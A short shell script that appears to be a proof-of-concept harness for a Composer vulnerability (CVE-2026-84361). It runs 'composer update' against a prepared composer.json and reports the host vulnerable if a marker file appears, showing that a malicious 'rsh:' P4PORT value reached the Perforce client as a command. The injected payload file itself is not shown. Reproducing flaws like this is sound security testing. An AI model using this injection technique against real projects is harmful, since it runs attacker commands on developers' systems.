#!/bin/sh
set -eu

workspace="$(mktemp -d)"
marker="/tmp/cve-2026-84361-success"
trap 'rm -rf "$workspace"' EXIT

rm -f "$marker"
cp /opt/poc/composer.json "$workspace/composer.json"
cd "$workspace"

set +e
composer update --prefer-source --no-interaction --no-plugins --no-scripts
status=$?
set -e

if [ -f "$marker" ]; then
    echo "[+] VULNERABLE: Composer passed the malicious rsh: P4PORT to p4."
    echo "[+] Marker created at $marker"
    echo "[*] Composer exit status $status is expected because the marker command is not a Perforce server."
    exit 0
fi

echo "[-] Marker was not created."
exit 1
